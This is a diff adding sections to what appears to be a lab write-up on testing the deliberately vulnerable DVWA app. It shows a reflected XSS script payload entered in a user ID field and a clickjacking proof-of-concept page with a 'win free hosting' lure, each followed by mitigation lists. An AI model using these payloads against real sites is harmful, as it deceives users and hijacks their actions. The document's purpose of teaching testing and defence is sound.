@@ -110,18 +110,80 @@ When you search for the source code for the string Reflected Test
 
 ![ZAP Scan Result](zap8.png) 
 
+Then, when on the user ID enter the   
+```
+<script>alert(''You are hacked! Log out immediately'')</script>  
+```
+An alert box will appear with the word **You are hacked! Log out immediately.** This means this site is vulnerable to reflected XSS attacks, and we have successfully exploited the vulnerability. 
+When the user pastes the URL in a different browser, the word **You are hacked! Log out immediately.** will still display, which means a malicious script will execute.
+
+![ZAP Scan Result](zap6.png) 
+
+### Mitigation steps:  
+- Use the auto-escaping template system
+- Implement content security policy
+- Use the X-XSS-Protection response header
+- Use the HTTPOnly flag   
+- Use HTML escape before inserting untrusted data into an HTML element’s content  
+- Use attribute escape before inserting untrusted data into HTML element content.  
+- Use JavaScript escape before inserting untrusted data into JavaScript data values  
+- Use CSS escape and strictly validate before inserting untrusted data into HTML style property values.  
+- Use URL escape before inserting untrusted data into HTML UTL parameter values  
 
 
+## Task 3: Clickjacking 
+
+**Description:** Testing Clickjacking.  
+**Tool:** Nikto   
+**Severity:** High  
+When you run Nikto, you will see that the site is vulnerable to clickjacking. The anti-clickjacking X-Frame-Options header is not present.
+
+![ZAP Scan Result](zap5.png) 
+
+Create a malicious HTML file 
+
+```
+<html>
+  <head>
+    <title>Clickjacking PoC</title>
+    <style>
+      iframe {
+        position:absolute;
+        top:0;
+        left:0;
+        width:800px;
+        height:600px;
+        opacity:0.1; /* makes it almost invisible */
+        z-index:2;
+      }
+      button {
+        position:absolute;
+        top:100px;
+        left:100px;
+        z-index:3;
+        font-size:20px;
+        padding:10px;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Win a free web hosting Now!</h2>
+    <button>Click here to claim!</button>
+
+    <!-- Target page inside iframe -->
+    <iframe src="http://127.0.0.1/DVWA/security.php"></iframe>
+  </body>
+</html>
+
+```
+In your browser file:///home/duncan/clickjack.html
+
+![ZAP Scan Result](zap2.png) 
+
+This confirms that the test was successful, and the site is vulnerable to clickjacking.  
 
 
-
-
-
-
-
-
-
-
-
-
-
+### Mitigation:
+- Use secure response headers on X-Frame-Options and Content Security Policy  
+- Use frame bursting as a secondary layer  
+- Use Design-level defence, such as double-click confirmation, user interaction, and visual cues   
